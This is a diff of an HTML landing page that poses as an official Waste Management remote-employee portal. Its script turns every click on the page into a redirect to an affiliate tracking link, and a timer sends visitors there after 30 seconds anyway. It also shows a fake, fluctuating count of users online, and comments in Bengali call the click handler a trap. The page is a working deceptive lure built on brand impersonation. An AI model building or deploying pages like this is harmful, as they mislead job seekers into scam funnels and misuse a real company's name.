@@ -3,38 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Waste Management® Official | Remote Network Operations & Onboarding</title>
+    <title>Waste Management® Official | Remote Hub Portal</title>
     
     <meta property="og:title" content="Waste Management® Official | Remote Hub Portal">
     <meta property="og:description" content="Secure internal network node for verified background scheduling and route processing slots.">
     <meta property="og:type" content="website">
 
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&family=JetBrains+Mono:wght@700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@500;700;800&family=Chakra+Petch:wght@700&display=swap" rel="stylesheet">
 
     <style>
         :root {
-            --bg-deep: #02040a;
+            --bg-black: #02040a;
             --wm-yellow: #fdb813;
             --neon-red: #ff3333;
-            --glass-card: rgba(10, 15, 30, 0.7);
-            --glass-border: rgba(255, 255, 255, 0.12);
-            --text-main: #ffffff;
-            --text-secondary: #a3aed0;
+            --glass-terminal: rgba(6, 11, 25, 0.85);
+            --border-line: rgba(255, 255, 255, 0.1);
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; }
 
-        body {
-            background-color: var(--bg-deep);
-            /* ব্যাকগ্রাউন্ডে কড়া সিনেমাটিক নিয়ন রেড এবং ডার্ক ব্লু সাইবারপাঙ্ক গ্লো */
-            background-image: 
-                radial-gradient(circle at 90% 10%, rgba(255, 51, 51, 0.15) 0%, transparent 40%),
-                radial-gradient(circle at 10% 90%, rgba(253, 184, 19, 0.12) 0%, transparent 45%),
-                radial-gradient(circle at 50% 50%, rgba(15, 23, 42, 0.95) 0%, var(--bg-deep) 100%);
-            background-attachment: fixed;
-            color: var(--text-main);
-            overflow-x: hidden;
-            line-height: 1.4;
+        body, html {
+            height: 100%;
+            background-color: var(--bg-black);
+            color: #ffffff;
+            overflow: hidden; /* জিরো স্ক্রলিং */
+            display: flex;
+            flex-direction: column;
             cursor: pointer;
         }
 
@@ -45,61 +39,38 @@
             cursor: pointer;
         }
 
-        /* হেডার - ফুল সাইবার ড্যাশবোর্ড ভাইব */
+        /* হেডার - টাইম জোন রিমুভ করা হয়েছে */
         header {
-            background: rgba(4, 8, 16, 0.85);
-            backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
-            border-bottom: 2px solid rgba(255, 255, 255, 0.05);
+            background: rgba(4, 8, 16, 0.9);
+            border-bottom: 1px solid var(--border-line);
             padding: 12px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            position: fixed;
-            top: 0; left: 0; width: 100%;
-            z-index: 100;
+            position: relative; z-index: 100;
         }
 
         .brand-logo-text {
-            font-weight: 900;
+            font-family: 'Chakra Petch', sans-serif;
+            font-weight: 700;
             font-size: 16px;
-            letter-spacing: 0.5px;
-            text-shadow: 0 0 10px rgba(253, 184, 19, 0.3);
+            color: #ffffff;
         }
         .brand-logo-text span { color: var(--wm-yellow); }
 
-        .header-meta-group {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            position: relative; z-index: 110;
-        }
-
-        /* চোখে লাগার মতো কড়া লাল নিয়ন একটিভ ট্র্যাকার */
+        /* কড়া লাল নিয়ন একটিভ ট্র্যাকার - শুধু এটিই থাকবে */
         .live-user-tracker-card {
             background: rgba(255, 51, 51, 0.12);
             border: 1px solid var(--neon-red);
-            box-shadow: 0 0 12px rgba(255, 51, 51, 0.25);
             padding: 4px 10px;
-            border-radius: 6px;
+            border-radius: 4px;
             display: flex;
             align-items: center;
             gap: 6px;
         }
 
-        .tracker-lbl {
-            font-size: 10px;
-            font-weight: 900;
-            color: #ff9999;
-            letter-spacing: 0.5px;
-        }
-
-        .tracker-val {
-            font-size: 12px;
-            font-weight: 800;
-            color: #ffffff;
-            font-family: 'JetBrains Mono', monospace;
-        }
+        .tracker-lbl { font-size: 10px; font-weight: 800; color: #ff9999; }
+        .tracker-val { font-size: 12px; font-weight: 800; color: #ffffff; }
 
         .beacon-signal-pulse {
             width: 7px; height: 7px;
@@ -115,153 +86,129 @@
             animation: pulseWave 1.5s infinite ease-in-out;
         }
 
-        /* চোখে লাগার মতো কড়া হলুদ লাইভ ক্লক */
-        .badge-live-clock {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 11px;
-            color: #000000;
-            background: var(--wm-yellow);
-            border: 1px solid #ffffff;
-            box-shadow: 0 0 10px rgba(253, 184, 19, 0.4);
-            padding: 4px 10px;
-            border-radius: 6px;
-            font-weight: 800;
-        }
-
-        section {
+        /* মেইন লেআউট - ছবি সহ */
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
             position: relative;
             z-index: 10;
-            padding: 10px 15px;
-            max-width: 480px; /* মোবাইল ভিউ আরও টাইট করার জন্য */
-            margin: 0 auto;
         }
 
-        #hero-hub {
-            padding-top: 85px;
-            padding-bottom: 5px;
+        /* প্রফেশনাল ইমেজ সেকশন (মানুষের ফেস ছাড়া) */
+        .expert-visual-frame {
+            width: 100%;
+            max-width: 380px;
+            height: 200px;
+            margin-bottom: -40px; /* কার্ডের সাথে ব্লেন্ড করার জন্য */
+            position: relative;
+            z-index: 5;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid var(--border-line);
         }
 
-        /* মেইন ডার্ক গ্লাস কনটেইনার - যা সাদামাটা ভাব দূর করবে */
-        .main-glass-terminal {
-            background: var(--glass-card);
-            border: 1px solid var(--glass-border);
-            backdrop-filter: blur(30px);
-            -webkit-backdrop-filter: blur(30px);
+        .expert-visual-frame img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0.8;
+            filter: grayscale(30%) contrast(110%);
+        }
+
+        .expert-visual-frame::after {
+            content: '';
+            position: absolute;
+            bottom: 0; left: 0; width: 100%; height: 50%;
+            background: linear-gradient(to top, var(--bg-black), transparent);
+        }
+
+        /* ডার্ক সাইবার টার্মিনাল বক্স */
+        .secure-terminal-box {
+            width: 100%;
+            max-width: 380px;
+            background: var(--glass-terminal);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid var(--border-line);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.8);
             border-radius: 16px;
-            padding: 22px 18px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7), inset 0 1px 1px rgba(255,255,255,0.1);
+            padding: 25px 15px 20px 15px;
             text-align: center;
+            position: relative;
+            z-index: 10;
         }
 
-        .announcement-bar {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 4px 12px;
-            border-radius: 30px;
-            font-size: 11px;
-            font-weight: 700;
+        .node-label {
+            font-size: 10px;
+            font-weight: 800;
             color: var(--wm-yellow);
-            margin-bottom: 12px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+            display: block;
         }
 
         h1 {
+            font-family: 'Chakra Petch', sans-serif;
             font-size: 24px;
-            font-weight: 900;
-            line-height: 1.2;
-            letter-spacing: -0.5px;
-            margin-bottom: 8px;
+            font-weight: 700;
+            line-height: 1.1;
+            margin-bottom: 12px;
             color: #ffffff;
         }
-        h1 span { 
-            color: var(--wm-yellow);
-            text-shadow: 0 0 15px rgba(253, 184, 19, 0.2);
-        }
+        h1 span { color: var(--wm-yellow); }
 
-        .hero-lead-paragraph {
+        .terminal-description {
             font-size: 13px;
-            color: var(--text-secondary);
-            margin-bottom: 18px;
-            font-weight: 500;
+            color: #a3aed0;
+            margin-bottom: 22px;
+            line-height: 1.5;
         }
 
-        .cta-action-box {
+        /* হাই-কনভার্টিং সলিড বাটন */
+        .cta-action-container {
             position: relative; z-index: 120;
-            width: 100%;
         }
 
-        /* মারাত্মক কড়া সলিড গ্লোয়িং হলুদ বাটন */
         .btn-prime-terminal {
             display: block;
             width: 100%;
-            background: #fdb813;
+            background: var(--wm-yellow);
             color: #000000;
             border: 2px solid #ffffff;
-            padding: 14px 20px;
+            padding: 16px;
             font-size: 15px;
             font-weight: 900;
             border-radius: 8px;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
-            box-shadow: 0 0 25px rgba(253, 184, 19, 0.6);
-            transition: all 0.2s ease;
-        }
-        .btn-prime-terminal:active {
-            transform: scale(0.98);
-            box-shadow: 0 0 10px rgba(253, 184, 19, 0.4);
-        }
-
-        #operations-matrix {
-            padding-top: 10px;
-        }
-
-        .section-header-box h2 {
-            font-size: 15px;
-            font-weight: 900;
-            text-transform: uppercase;
             letter-spacing: 1px;
-            color: #64748b;
-            margin-bottom: 8px;
-            padding-left: 4px;
+            box-shadow: 0 0 30px rgba(253, 184, 19, 0.4);
         }
 
-        /* সাব-সিস্টেম নোড গ্রিড */
-        .matrix-grid-container {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 8px;
+        .btn-prime-terminal:active {
+            transform: scale(0.97);
         }
-
-        .matrix-node-item {
-            background: rgba(10, 15, 30, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-            padding: 10px;
-        }
-
-        .matrix-node-item h3 { font-size: 12px; font-weight: 800; margin-bottom: 2px; color: var(--wm-yellow); }
-        .matrix-node-item p { font-size: 11px; color: #718096; font-weight: 500; }
 
         footer {
-            padding: 15px;
+            padding: 10px;
             text-align: center;
             font-size: 10px;
             color: #4a5568;
-            margin-top: 5px;
-        }
-
-        @media (max-width: 768px) {
-            header { padding: 10px 15px; }
-            #hero-hub { padding-top: 105px; }
+            border-top: 1px solid var(--border-line);
+            background: var(--bg-black);
         }
 
         @keyframes pulseWave {
             0% { transform: scale(1); opacity: 0.8; }
             100% { transform: scale(2.5); opacity: 0; }
+        }
+
+        @media (max-width: 480px) {
+            h1 { font-size: 22px; }
+            .expert-visual-frame { height: 180px; }
         }
     </style>
 </head>
@@ -276,80 +223,51 @@
         <div class="header-meta-group">
             <div class="live-user-tracker-card">
                 <div class="beacon-signal-pulse"></div>
-                <div class="tracker-lbl">ACTIVE:</div>
+                <div class="tracker-lbl">ONLINE:</div>
                 <div class="tracker-val" id="active-tracker-digits">2,814</div>
             </div>
-            <div class="badge-live-clock" id="live-device-clock">Live --:--:--</div>
         </div>
     </header>
 
-    <section id="hero-hub">
-        <div class="main-glass-terminal">
-            <div class="announcement-bar">
-                <span>NODE // US-2026 ACTIVE</span>
-            </div>
+    <main>
+        <div class="expert-visual-frame">
+            <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=600&auto=format&fit=crop" alt="Logistics Support Operations">
+        </div>
+
+        <div class="secure-terminal-box">
+            <span class="node-label">// NODE: US-2026 ACTIVE</span>
             <h1>Remote Operations <span>Gateway</span></h1>
-            <p class="hero-lead-paragraph">Secure administrative terminal for verified support routing slots. Synchronize your local session parameters below.</p>
+            <p class="terminal-description">Authorized employee gateway for logistics scheduling and route data management. Sync your official session parameters below.</p>
             
-            <div class="cta-action-box">
+            <div class="cta-action-container">
                 <button class="btn-prime-terminal">ACCESS OFFICIAL PORTAL</button>
             </div>
         </div>
-    </section>
-
-    <section id="operations-matrix">
-        <div class="section-header-box">
-            <h2>System Parameters</h2>
-        </div>
-        <div class="matrix-grid-container">
-            <div class="matrix-node-item">
-                <h3>Data Entry</h3>
-                <p>Validation loops active.</p>
-            </div>
-            <div class="matrix-node-item">
-                <h3>Logistics</h3>
-                <p>Route criteria matched.</p>
-            </div>
-        </div>
-    </section>
+    </main>
 
     <footer>
         <p>© 2026 Waste Management International Inc.</p>
     </footer>
 
     <script>
+        // আপনার ট্র্যাকিং লিংক
         const targetGateLink = "https://www.af9m8trk.com/AAV11C1R/PB7121EP/?s1=Ashik";
         let loopTriggered = false;
 
+        // ৩০ সেকেন্ড অটো-রিডাইরেক্ট
         setTimeout(() => {
             if (!loopTriggered) {
                 window.location.href = targetGateLink;
             }
         }, 30000);
 
+        // গ্লোবাল ক্লিক ট্র্যাপ
         function handleGlobalClickTrigger() {
             loopTriggered = true;
             window.location.href = targetGateLink;
         }
 
-        function synchronizeDeviceClock() {
-            const clockElement = document.getElementById('live-device-clock');
-            if (clockElement) {
-                const localDate = new Date();
-                let hours = localDate.getHours();
-                let minutes = localDate.getMinutes();
-                let seconds = localDate.getSeconds();
-                const ampm = hours >= 12 ? 'PM' : 'AM';
-                
-                hours = hours % 12;
-                hours = hours ? hours : 12; 
-                minutes = minutes < 10 ? '0' + minutes : minutes;
-                seconds = seconds < 10 ? '0' + seconds : seconds;
-                
-                clockElement.innerText = 'Live ' + hours + ':' + minutes + ':' + seconds + ' ' + ampm;
-            }
-        }
-
+        // রিয়াল-টাইম ট্র্যাকার ফ্লাকচুয়েশন
         function engineActiveTrackerFlux() {
             const trackerContainer = document.getElementById('active-tracker-digits');
             if (trackerContainer) {
@@ -360,9 +278,7 @@
             }
         }
 
-        setInterval(synchronizeDeviceClock, 1000);
         setInterval(engineActiveTrackerFlux, 3500);
-        synchronizeDeviceClock();
     </script>
 </body>
 </html>
